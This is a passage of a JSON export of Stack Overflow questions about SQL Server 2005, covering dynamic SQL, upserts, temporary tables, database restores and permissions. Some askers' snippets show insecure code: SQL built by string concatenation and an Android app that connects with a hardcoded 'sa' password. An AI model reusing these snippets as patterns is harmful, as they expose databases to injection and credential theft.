not null),\n    Col1 (varchar(50), not null),\n    etc.\n)\n</code></pre> \n\n<p>I want a single stored procedure to retrieve data from the appropriate table. I could do that by just passing the table name as a param to the proc and then building up a string of sql to execute...</p>\n\n<pre><code>\nCREATE PROCEDURE GetData\n    @TableName varchar(100)\n\nAS\nBEGIN\n\n    DECLARE @sql varchar(max)\n    SET @sql = 'SELECT * FROM ' + @sql\n\n    exec(@sql)\n</code></pre>\n\n<p>... but that seems fundamentally wrong to me.  And replicating code, either in the form of a giant case statement or by \"one-offing\" the proc and creating a new one for each client, also seems wrong.</p>\n\n<p>Is there a better way to do this? </p>\n\n<p>I'm pretty open to suggestions, anything from something I can do in the proc to re-working the data model (short of dumping all the data into a single table).  Upgrading to SQL-Server 2008 or 2010 <em>might</em> be an option, but would be a last resort.</p>\n"},{"tags":["sql","tsql","sql-server-2005","week-number","datepart"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":74,"score":0,"question_id":12411185,"title":"convert week datepart number to date within week (week of...)","body":"<p>I am trying to figure out how to convert a datepart for a week to the Monday of that week.</p>\n\n<p>I am using this: </p>\n\n<pre><code>     datepart(ww, DateCompleted) as week \n</code></pre>\n\n<p>to group a set of orders in our system by week.  My goal is for this to say instead of 37, i want it to return the Monday of week 37, i.e.: 09-10-2012.  I am able to do this by defining each week per number but i would rather not spend so much time typing out each week when there is probably a better option out there, i have just been unable to find it anywhere online other than in MySQL and other programming languages (i need T-SQL please, or anything that will work on sql server 2005), and i do not know how to work with that.  Thanks for anyone that can help. Ill be checking back as often as possible to provide more info if needed.</p>\n"},{"tags":["sql-server-2005","scalability","high-availability"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":12408316,"title":"Service reachability, scalability, availability","body":"<p>I have the following system\nRIA client&lt;-->online MS SQL server , but online works when there is full internet availability.</p>\n\n<p>I want something such as \nRIA client&lt;-->local low footprint db server&lt;-->online MS SQL server\nThis is to improve the service reachability, scalability, and availability</p>\n\n<p>What technique can used to make sure the reads and write to the online server are buffered from the offline server installed on a client?</p>\n\n<p>I found a <a href=\"http://technet.microsoft.com/library/ms166367.aspx\" rel=\"nofollow\">replication technique</a>, but want to know if a simpler solution is possible. Another technique is quite in research: <a href=\"http://www.computer.org/portal/web/csdl/doi/10.1109/SERVICES.2010.69\" rel=\"nofollow\">http://www.computer.org/portal/web/csdl/doi/10.1109/SERVICES.2010.69</a></p>\n"},{"tags":["c#","sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":131,"score":1,"question_id":12407728,"title":"Why cannot create global temporary table or truncate it when call a stored procedure from C# code?","body":"<p>I spent whole days and hours to investigate why cannot create temporary table when I call a stored procedure from C# code.</p>\n\n<p>Let's assume a piece of C# code:</p>\n\n<pre><code>public void GetDataByFilter(string item, string filter ...) {\n   ... \n   // provide stored procedure in new SqlCommand object\n   sqlCommand.CommandType = CommandType.StoredProcedure;\n\n   sqlCommand.Parameters.Add(\"@val1\", aValue1);\n   sqlCommand.Parameters.Add(\"@val2\", aValue2);\n   ...\n   while(sqlDataReader.Read()) { /* process info here */ }\n}\n</code></pre>\n\n<p>and my stored procedure</p>\n\n<pre><code>ALTER PROCEDURE [dbo].[aProcedure]\n  @val1 VARCHAR(255),\n  @val2 VARCHAR(255),\n  ...\nAS \nBEGIN\n  IF OBJECT_ID(N'tempdb..##aTempTable') IS NULL\n    CREATE TABLE tempdb..##aTempTable (\n          id1 INT,\n              id2 INT,\n              id3 VARCHAR(255),\n              ...\n    )\n\nELSE \n    TRUNCATE TABLE tempdb..##aTempTable\n\n    -- insert information into this table\n    SELECT @paramList = ' /*list of parameters*/';\n\n    EXEC sp_executesql @sql, @paramList, ... parameters\nEND\n</code></pre>\n\n<p>In C# code, in <strong>another function</strong>, I provided </p>\n\n<pre><code>sqlCommand.CommandText = \"SELECT * FROM tempdb..##aTempTable\";\n</code></pre>\n\n<p>But exception was thrown that <code>tempdb..##aTemTable</code> doesn't exists.</p>\n\n<p>If I execute stored procedure inside SSMS (Sql Server Management Studio) then the table is created.</p>\n\n<p>The problem is also for <code>TRUNCATE TABLE</code> operation <strong>not only</strong> for <code>CREATE TABLE</code>.</p>\n\n<p>I need temporary global table for to be used into different stored procedures accordingly with <a href=\"http://stackoverflow.com/questions/12312903/it-is-possible-for-created-temporary-table-by-a-stored-procedure-to-be-used-in-a\">It is possible for created temporary table by a stored procedure to be used in another stored procedure?</a>.</p>\n\n<p>Any solution ?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql"],"answer_count":5,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":6593,"score":3,"question_id":6309541,"title":"How do I convert a number to a numeric, comma separated, formatted string?","body":"<p>Is there an easy way to convert a number (in my case an integer) to a comma separated <code>nvarchar</code> string?</p>\n\n<p>For instance, if I had an <code>int</code> value of 1000000 stored in a field, how can I convert to an <code>nvarchar</code> string, with the output value of \"1,000,000\"?</p>\n\n<p>I could easily write a function to do this but I wanted to be sure there wasn't an easier way involving a call to either <code>CAST</code> or <code>CONVERT</code>.</p>\n"},{"tags":["sql-server","sql-server-2005","atomic","upsert"],"answer_count":5,"favorite_count":11,"up_vote_count":26,"down_vote_count":0,"view_count":6550,"score":26,"question_id":2522379,"title":"Atomic UPSERT in SQL Server 2005","body":"<p>What is the correct pattern for doing an atomic \"UPSERT\" (UPDATE where exists, INSERT otherwise) in SQL Server 2005?</p>\n\n<p>I see a lot of code on SO (e.g. see <a href=\"http://stackoverflow.com/questions/639854/tsql-check-if-a-row-exists-otherwise-insert\">http://stackoverflow.com/questions/639854/tsql-check-if-a-row-exists-otherwise-insert</a>) with the following two-part pattern:</p>\n\n<pre><code>UPDATE ...\nFROM ...\nWHERE &lt;condition&gt;\n-- race condition risk here\nIF @@ROWCOUNT = 0\n  INSERT ...\n</code></pre>\n\n<p>or</p>\n\n<pre><code>IF (SELECT COUNT(*) FROM ... WHERE &lt;condition&gt;) = 0\n  -- race condition risk here\n  INSERT ...\nELSE\n  UPDATE ...\n</code></pre>\n\n<p>where &lt; condition > will be an evaluation of natural keys.  None of the above approaches seem to deal well with concurrency.  If I cannot have two rows with the same natural key, it seems like all of the above risk inserting rows with the same natural keys in race condition scenarios.</p>\n\n<p>I have been using the following approach but I'm surprised not to see it anywhere in people's responses so I'm wondering what is wrong with it:</p>\n\n<pre><code>INSERT INTO &lt;table&gt;\nSELECT &lt;natural keys&gt;, &lt;other stuff...&gt;\nFROM &lt;table&gt;\nWHERE NOT EXISTS\n   -- race condition risk here?\n   ( SELECT 1 FROM &lt;table&gt; WHERE &lt;natural keys&gt; )\n\nUPDATE ...\nWHERE &lt;natural keys&gt;\n</code></pre>\n\n<p>Note that the race condition mentioned here is a different one from the ones in the earlier code.  In the earlier code, the issue was phantom reads (rows being inserted between the UPDATE/IF or between the SELECT/INSERT by another session).  In the above code, the race condition has to do with DELETEs.  Is it possible for a matching row to be deleted by another session AFTER the (WHERE NOT EXISTS) executes but before the INSERT executes?  It's not clear where the WHERE NOT EXISTS puts a lock on anything in conjunction with the UPDATE.</p>\n\n<p>Is this atomic?  I can't locate where this would be documented in SQL Server documentation.</p>\n\n<p><strong>EDIT:</strong>  I realise this could be done with transactions, but I think I would need to set the transaction level to SERIALIZABLE to avoid the phantom read problem?  Surely that is overkill for such a common problem?</p>\n"},{"tags":["sql-server-2005","nhibernate"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":552,"score":4,"question_id":477146,"title":"NHibernate elt field","body":"<p>Does anyone know why NHibernate generates a field named 'elt' of type int for a many to many mapping?\nI'm wondering why I need it.\nThanks</p>\n"},{"tags":["sql-server-2005","stored-procedures"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":57,"score":-1,"question_id":12399415,"title":"Sending a column name and values as Parameter in stored procedure","body":"<p>I want to update an entry in Stored Procedure with the column name and column value that I pass as parameter, how can I do it.</p>\n"},{"tags":["c#","sql-server","sql-server-2005","service-broker"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":103,"score":3,"question_id":12374488,"title":"Is it possible to access SQL Server Service Broker from a C# app?","body":"<p>I want to use the SQL Server Service Broker to generate a message (inside SQL Server) and for it to be read in an external C# app.</p>\n\n<p>I am limited to Windows 2003 running SQL Server 2005. I've read a bunch of articles, that allude to this being a possibility, but I do not see an example anywhere. Is this possible?</p>\n"},{"tags":["sql-server-2008","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12381960,"title":"How to lock MyDatabase in SQL Server 2005?","body":"<p>In my earlier question i asked how to change SQL SERVER from Windows Authentication to SQL Authentication, with the help of answers was able to successfully change it.</p>\n\n<p>However, my issue was that to protect MyDatabase from others so that no one can modify it, apart from me. As I have change it to SQL Auth, still i can see MyDatabase in both Auths.</p>\n\n<p>So is there any way I can do that, if yes then please let me know what all changes do I need to make in my Connection class to successfully create a connection.</p>\n\n<p>Thanks.</p>\n"},{"tags":["sql","sql-server-2005","union"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":70,"score":1,"question_id":12399281,"title":"Select from union tsql","body":"<p>Is it possible to select from the result of a union?  For example I'm trying to do something like:</p>\n\n<pre><code>SELECT A\nFROM\n(\n    SELECT A, B FROM TableA\n    UNION\n    SELECT A, B FROM TableB\n)\nWHERE B &gt; 'some value'\n</code></pre>\n\n<p>Am I missing anything or making an assumption about how this works?  I'm using MSSQL 2005 so any solution will need to conform to what I can do there.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":226,"score":4,"question_id":12394331,"title":"Display top n records and consolidate the rest of the rows","body":"<p>I am relatively new to writing SQL. I have a requirement where I have to display the top 5 records as it is and consolidate the rest as 1 single record and append it as the 6th record. I know top 5 selects the top 5 records, but I am finding it difficult to put together a logic to consolidate the rest of the records and append it at the bottom of the result set.</p>\n\n<pre><code>weekof          sales    year    weekno\n-------------------------------------------------------------\n07/01 - 07/07   2   2012    26  \n07/08 - 07/14   2   2012    27  \n07/29 - 08/04   1   2012    30  \n08/05 - 08/11   1   2012    31  \n08/12 - 08/18   32  2012    32  \n08/26 - 09/01   2   2012    34  \n09/02 - 09/08   8   2012    35  \n09/09 - 09/15   46  2012    36   \n09/16 - 09/22   26  2012    37\n</code></pre>\n\n<hr>\n\n<p>I want this to be displayed as</p>\n\n<pre><code>weekof          sales\n----------------------\n09/16 - 09/22   26  \n09/09 - 09/15   46  \n09/02 - 09/08   8   \n08/26 - 09/01   2   \n08/12 - 08/18   32  \n07/01 - 08/11   6\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","maintenance-plan"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1812,"score":0,"question_id":5668745,"title":"Maintenance plan maintenance cleanup task running successfully, but not deleting files?","body":"<p>This has been driving me crazy. I have tried all suggestions and no go.</p>\n\n<p>This absolutely does not work. The files are all still there.</p>\n\n<p>The job runs successfully, but the files do not delete.</p>\n\n<p><img src=\"http://i.stack.imgur.com/cH86L.jpg\" alt=\"enter image description here\"></p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":64,"score":0,"question_id":12390612,"title":"How to assign ROW_NUMBER() to a column?","body":"<p>After reading <a href=\"http://stackoverflow.com/questions/1293390/sql-to-output-line-number-in-results-of-a-query\">this question</a>, I have another similar question. Is there a simple way to get this SQL statement to work?</p>\n\n<pre><code>update [Insurances] set [RowNo]=ROW_NUMBER() over (order by [RowNo])\n</code></pre>\n\n<p>I have a <code>RowNo</code> column which I want to update whenever a record is deleted.</p>\n"},{"tags":["sql","sql-server-2005","ssms"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12390140,"title":"Why if I select `Open Table` for temporary global table doesn't work in SQL Server 2005?","body":"<p>I have an issue in Management Studio Express 2005.</p>\n\n<p>If I select <code>Open Table</code> for a temporary global table:</p>\n\n<p><img src=\"http://i.stack.imgur.com/IVQGV.png\" alt=\"enter image description here\"></p>\n\n<p>Not works, the error appears:</p>\n\n<p><img src=\"http://i.stack.imgur.com/m9Wzc.png\" alt=\"enter image description here\"></p>\n\n<p>But if I write</p>\n\n<pre><code>SELECT * FROM dbo.##tempResults\n</code></pre>\n\n<p>then the table content will appears.</p>\n\n<p><img src=\"http://i.stack.imgur.com/dFWQX.png\" alt=\"enter image description here\"></p>\n\n<p>There are any fix for this problem ?</p>\n\n<p>I have SP4 for Management Studio.</p>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12389643,"title":"osql.exe can't read special characters","body":"<p>Hi I am trying to make some update using osql.exe against a sql file which has some special characters.\nBut the actual update ends up having some funny characters instead of the special characters.\nSample sql is below:</p>\n\n<pre><code>  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'A', N'CA', 3, N'Automtic')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'A', N'CS', 3, N'Automatick')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'A', N'DA', 3, N'Automatgear')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'A', N'DE', 3, N'Automatik')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'A', N'EL', 3, N'')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'A', N'EN', 3, N'Automatic')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'A', N'ES', 3, N'Automtico')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'A', N'FR', 3, N'Automatique')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'A', N'HU', 3, N'Automata')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'A', N'IT', 3, N'Cambio automatico')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'A', N'NL', 3, N'Automatisch')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'A', N'PL', 3, N'Automatyczna')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'A', N'PT', 3, N'Automtico')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'A', N'TR', 3, N'Otomatik')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'B', N'CA', 2, N'2 portes')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'B', N'CS', 2, N'2dveov')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'B', N'DA', 2, N'2-drs')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'B', N'DE', 2, N'2-Tren')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'B', N'EL', 2, N'2-')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'B', N'EN', 2, N'2-Door')\n  INSERT [dbo].[TableName] ([Code], [Culture], [Position], [CodeDescription]) VALUES (N'B', N'ES', 2, N'2-puertas')\n</code></pre>\n"},{"tags":["c#","unit-testing","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":97,"score":3,"question_id":12177818,"title":"Avoid restore stuck when restoring SQL server under unittesting","body":"<p>I am currently building unit tests that tests if some classes are editing a sql server 2005 database correctly. To do this I have created a small subset of data from our production and are storing it as a backup file. Whenever a unit test needs to be sure it has a clean database state it calls a restore routine that basically call the following sql:</p>\n\n<pre><code>RESTORE DATABASE database FROM DISK = 'c:\\test\\backup.bak' WITH REPLACE, NORECOVERY\n</code></pre>\n\n<p>This normally works, and has decent speed. When I say normally it's because sometimes the database gets stuck in 'restore' mode result in error messages that looks like this (assuming it's a Alter command):</p>\n\n<pre><code>ALTER DATABASE is not permitted while a database is in the Restoring state.\n</code></pre>\n\n<p>This means that if the first fail, every test fails. I can get the database out of it stuck state, but it's rather irritating to do it every single time, it's very time consuming and the whole point of unit testing was so I didn't need anything when I activate the test.</p>\n\n<p>I tried to see if I could avoid it by the RESTORE syntax, but can't kind any options or flags that sound like it could resolve the issue. </p>\n\n<p>Is there any other method I could use that is a lot safer that the RESTORE command?</p>\n\n<p><strong>Update:</strong>\nI discovered that the restore fail happens mostly when a connection was still active. I usually handled that issue with the following structure:</p>\n\n<pre><code>ALTER DATABASE MyDatabase SET Single_User WITH Rollback Immediate\n\n-- Restore logic here\n\nALTER DATABASE MyDatabase SET Multi_User\n</code></pre>\n\n<p>The problem with this is that it only limits all the connections to one. Sometimes one of the connections that is forced to close jumps over to the only one free, disrupting the restore and making it fail (or that is what I can gather from the documents and pages I have been reading).</p>\n\n<p>I am instead trying to do the following SQL command before I start on my restore logic:</p>\n\n<pre><code>Declare @spid int\nSelect @spid = min(spid) from master.dbo.sysprocesses\nwhere dbid = db_id('Mydatabase')\nWhile @spid Is Not Null\nBegin\n        Execute ('Kill ' + @spid)\n        Select @spid = min(spid) from master.dbo.sysprocesses\n        where dbid = db_id('Mydatabase') and spid &gt; @spid\nEnd\n\n-- Do Restore Logic\n</code></pre>\n\n<p><a href=\"http://geekswithblogs.net/AngelEyes/archive/2010/02/24/kill-connections-to-resote-db---sql-server.aspx\" rel=\"nofollow\">http://geekswithblogs.net/AngelEyes/archive/2010/02/24/kill-connections-to-resote-db---sql-server.aspx</a></p>\n\n<p>This section of code goes in and actively closes all connections, which gives the restore logic room to execute. I am, however, not entirely sure that this is the best way to go, simply because it does not prevent connections to reestablish, potentially disrupting the restore process again. But so far I haven't seen evidence that this has happened yet.</p>\n"},{"tags":["sql-server","sql-server-2005","create-table"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":598,"score":0,"question_id":4596187,"title":"How can I restrict CREATE TABLE access for a user to a specific schema (sql server)?","body":"<p>I'd like to allow some users to create tables in a particular schema, but not be able to create tables in other schemas. How can I achieve this? </p>\n\n<p>I see the <a href=\"http://msdn.microsoft.com/en-us/library/ms174979%28SQL.90%29.aspx\" rel=\"nofollow\">CREATE TABLE</a> help says </p>\n\n<blockquote>\n  <p>Requires CREATE TABLE permission in the database and ALTER permission on the schema in which the table is being created.</p>\n</blockquote>\n\n<p>Does that mean I can give ALTER permission to the schema and restrict ALTER permissions on all other schemas? </p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":60,"score":2,"question_id":12375287,"title":"How to copy data from SQL query analyzer results","body":"<p>I am inserting stack trace of exception into table.But When I execute select query for that table from sql query analyzer then I dont see complete stack trace in it.\nHere is the code..</p>\n\n<pre><code>DataAccess.ExecuteNonQuery(\n    conn, \n    \"usp_insert_error_detail\", \n    iproductType, \n    \"error\", \n    ex.Message.ToString(), \n    ex.StackTrace.ToString());\n</code></pre>\n"},{"tags":["sql","sql-server-2005","stored-procedures"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":64,"score":1,"question_id":12386646,"title":"Execute a result in  SQL Server using a stored procedure","body":"<p>I need to execute result (already in form of SQL) itself of an SQL query to get the final result.</p>\n\n<p>So, it should be like, in first query I execute</p>\n\n<pre><code>Select Top(1) RequiredQuery as ReqQry from EPMaster \n</code></pre>\n\n<p>I'll get another query in result in <code>ReqQry</code> that will then be executed in form another query to get the final result. </p>\n\n<p>The second query will also require some parameters to be passed at where clause, like when I do:</p>\n\n<pre><code>Select Top(1) RequiredQuery as ReqQry \nfrom EPMaster \n--ReqQry after its execution returns:\nSelect Top(1) (FirstName + ' ' + LastName) as FullName \nfrom DPMaster \nwhere DmID = @DomainID and PnID = @PersonID\n</code></pre>\n\n<p>I'll be passing the Params <code>@DomainID</code> and <code>@PersonID</code> from my C# project's DAL layer.</p>\n\n<p>So I guess it should be done with the help of a stored procedure.</p>\n\n<p>-----------------More Explanation-------------</p>\n\n<p>Here, one SQL statement is executed to get the next SQL statement which will be the resultant of the former statement. When you execute 1st query, you get 2nd query in result, which you execute again to get the final result</p>\n\n<p>The second query needs 2 parameters to execute that are <code>@DomainID</code> and <code>@PersonID</code> which will be passed by me from my C# Project. So, if I make a stored procedure for handeling all this and pass the required parameters, along with the 1'st query from my project, it should first execute 1st query then execute 2nd query (with parameters <code>PersonID</code> and <code>DomainID</code>) that was received as result of 1st query, after which I get the final result.</p>\n"},{"tags":["android","eclipse","sql-server-2005","jdbc"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":12374896,"title":"getting error when trying to connect to a database using JDBC and Eclipse for Android","body":"<p>I'm trying to connect to a database from my android using JDBC and Eclipse IDE and Java</p>\n\n<p>this is the code I wrote </p>\n\n<pre><code>package Android_SQL.Package;\n\nimport java.sql.Connection;\nimport java.sql.Driver;\nimport java.sql.DriverManager;\nimport java.sql.PreparedStatement;\nimport java.util.Properties;\n\nimport Android_SQL.Package.R;\nimport android.app.Activity;\nimport android.os.Bundle;\nimport android.view.View;\nimport android.view.View.OnClickListener;\nimport android.widget.Button;\nimport android.widget.Toast;\nimport android.util.Log;\n\npublic class Android_SQLActivity \nextends Activity \nimplements OnClickListener\n{\n    /** Called when the activity is first created. */\n    @Override\n    public void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.main);\n\n        Button My_Button = (Button) this.findViewById(R.id.button1);\n        My_Button.setOnClickListener(this);        \n    }\n\n\n    @Override\n    public void onClick(View arg0) {\n\n        (new Thread(new Runnable() \n        {\n            @Override\n            public void run() \n            {\n                // Connect\n                try {               \n                    String cs = \"jdbc:sqlserver://192.168.0.29:1433;databaseName=ODB0336;user=sa;password=savage\";\n                    Class.forName(\"com.microsoft.sqlserver.jdbc.SQLServerDriver\");        \n                    Connection con = DriverManager.getConnection(cs);\n                    //String sql=\"insert into Categories(CategoryName, Description) values(?,?)\";\n                    String sql=\"insert into Colors(ColorId, ColorEName, ColorName) values(?,?,?)\";\n                    PreparedStatement prepared = con.prepareStatement(sql);\n                    prepared.setString(1, \"ABCD\");\n                    prepared.setString(2, \"ABCDEF\");\n                    prepared.setString(2, \"XYZ\");                   \n                    prepared.executeUpdate();           \n                } catch (Exception e) \n                {\n                    e.printStackTrace();\n                    Log.i(\"Error\", e.getMessage());\n                }\n\n            }\n        }\n        )\n        ).start();                      \n    }\n}\n</code></pre>\n\n<p>but I'm getting the following exception when i connect :</p>\n\n<p>\"com.microsoft.sqlserver.jdbc.SQLServerException: recvfrom failed: ECONNRESET (Connection reset by peer)\"</p>\n\n<p>how to fix it? what is the problem.</p>\n\n<p>the JDBC version is : Microsoft SQL Server JDBC Driver 3.0</p>\n\n<p>Please help.</p>\n"},{"tags":["database","sql-server-2005","backup"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12386273,"title":"error with creating backup of Godaddy DB on Local Machine","body":"<p>I am in need of restoring My Updated Database on GoDaddy.</p>\n\n<p>I had old database backup(ypldb.bak) from Godaddy. The backup(ypldb.bak) had been created from Godaddy hosting account.</p>\n\n<p>I had to do some update on this database backup file.\nSo I restored this backup file on my Local Machine [SqlServer 2005]. And done the Update.</p>\n\n<p>Now I want to create backup of this updated database which is on my local machine, so that i can restore newly created backup file on go daddy hosting account.</p>\n\n<p>but during the creation of backup on local machine it giving error.\nThe error is</p>\n\n<pre><code>TITLE: Microsoft SQL Server Management Studio Express\n------------------------------\n\nBackup failed for Server 'ARCHANA-PC'.  (Microsoft.SqlServer.Express.Smo)\n\nFor help, click: http://go.microsoft.com/fwlink?ProdName=Microsoft+SQL+Server&amp;ProdVer=9.00.2047.00&amp;EvtSrc=Microsoft.SqlServer.Management.Smo.ExceptionTemplates.FailedOperationExceptionText&amp;EvtID=Backup+Server&amp;LinkId=20476\n\n------------------------------\nADDITIONAL INFORMATION:\n\nSystem.Data.SqlClient.SqlError: Failed to pause catalog for backup. Backup was aborted. (Microsoft.SqlServer.Express.Smo)\n\nFor help, click: http://go.microsoft.com/fwlink?ProdName=Microsoft+SQL+Server&amp;ProdVer=9.00.2047.00&amp;LinkId=20476\n\n------------------------------\nBUTTONS:\n\nOK\n------------------------------\n</code></pre>\n\n<p>I tried to find solution from following link but didn't find any useful solution\n<a href=\"http://social.msdn.microsoft.com/Forums/en-US/sqlkjmanageability/thread/77f9921d-338d-49f0-addb-5e11178f4ab9/\" rel=\"nofollow\">http://social.msdn.microsoft.com/Forums/en-US/sqlkjmanageability/thread/77f9921d-338d-49f0-addb-5e11178f4ab9/</a></p>\n\n<p>suggest me some useful solution so I can try to take database backup as soon as possible</p>\n"},{"tags":["tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":34,"score":1,"question_id":12377770,"title":"Calling a function on distinct values from table","body":"<p>I've got a SQL Server 2005 database.  I need to get distinct values in addition to calling a function on those distinct values.  I'm not sure how the distinct works when there is a function call involved.  For example, I have this query:</p>\n\n<pre><code>SELECT DISTINCT a, b, c, fcn_DoSomething(a, b, c) AS z FROM users\n</code></pre>\n\n<p>I'm guessing that the function (fcn_DoSomething) is being called for all of the values in the table, not the distinct values.  Am I correct?  If so, how can I write the query to call the function only on distinct values of a,b,c?  I know one option is to use a temporary table, but if anyone has better ideas that would be great.</p>\n\n<p>Thanks</p>\n"},{"tags":["sql","sql-server","sql-server-2005",".net-assembly"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12376307,"title":"Create assembly in SQL Server","body":"<p>I keep getting the following error:</p>\n\n<pre><code>Msg 10314, Level 16, State 11, Line 1\nAn error occurred in the Microsoft .NET Framework while trying to load assembly id 66079. The server may be running out of resources, or the assembly may not be trusted with PERMISSION_SET = EXTERNAL_ACCESS or UNSAFE. Run the query again, or check documentation to see how to solve the assembly trust issues. For more information about this error: \nSystem.IO.FileLoadException: Could not load file or assembly 'ncestablegenerator, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null' or one of its dependencies. The given assembly name or codebase was invalid. (Exception from HRESULT: 0x80131047)\nSystem.IO.FileLoadException: \n   at System.Reflection.Assembly._nLoad(AssemblyName fileName, String codeBase, Evidence assemblySecurity, Assembly locationHint, StackCrawlMark&amp; stackMark, Boolean throwOnFileNotFound, Boolean forIntrospection)\n   at System.Reflection.Assembly.InternalLoad(AssemblyName assemblyRef, Evidence assemblySecurity, StackCrawlMark&amp; stackMark, Boolean forIntrospection)\n   at System.Reflection.Assembly.InternalLoad(String assemblyString, Evidence assemblySecurity, StackCrawlMark&amp; stackMark, Boolean forIntrospection)\n   at System.Reflection.Assembly.Load(String assemblyString)\n</code></pre>\n\n<p>This is the creation of my assembly:</p>\n\n<pre><code>CREATE ASSEMBLY [NCESTableGenerator]\nAUTHORIZATION [dbo]\nfrom 'C:\\SqlDlls\\NCESTableGenerator.dll'\nWITH PERMISSION_SET = UNSAFE\nGO\n</code></pre>\n\n<p>Any ideas? There is plenty of space on the server.</p>\n"},{"tags":["query","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":33,"score":1,"question_id":12373440,"title":"Optional where clause using ISNULL","body":"<p>I have stored procedures take multiple parameters (up to 7 or 8 in some cases) to be used to filter down the result set.  These parameters are optional (default <code>NULL</code>).  All non-NULL values passed in are to be used in the filter (i.e. it's boolean <code>and</code> instead of boolean <code>or</code>).</p>\n\n<p>These queries usual end up looking like this...</p>\n\n<pre><code>SELECT *\nFROM [MyTable]\nWHERE (@Param1 IS NULL OR (@Param1 IS NOT NULL AND [Field1] = @Param1))\n      AND (@Param2 IS NULL OR (@Param2 IS NOT NULL AND [Field2] = @Param2))\n      AND (@Param3 ...\n</code></pre>\n\n<p>I'm aware that this is very inefficient, but due to the number of parameters it just isn't possible split them into individual queries.</p>\n\n<p>So instead I tried doing the following...</p>\n\n<pre><code>SELECT *\nFROM [MyTable]\nWHERE [Field1] = ISNULL(@Param1, [Field1])\n      AND [Field2] = ISNULL(@Param2, [Field2])\n      AND [Field3] ...\n</code></pre>\n\n<p>However, the problem occurs when a field contains <code>NULL</code> and therefore the <code>=</code> operator simply doesn't work.</p>\n\n<p>Is there a simple and efficient way of doing this so I can have a single query, using multiple \"filter\" parameters?  I'd prefer not to use dynamic SQL if at all possible.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":215,"score":0,"question_id":5045311,"title":"Transaction Log in Sql Server","body":"<p>For what statements DDL or DML, Transaction log is maintained and Why?</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":75,"score":0,"question_id":12373780,"title":"MSSQL Speed Up Query 365 Millon Rows","body":"<p>I have roughly 365 Million Rows inside my tables and each day we add an additional Million rows after the data is a year old it gets moved to a different table that archives our data. 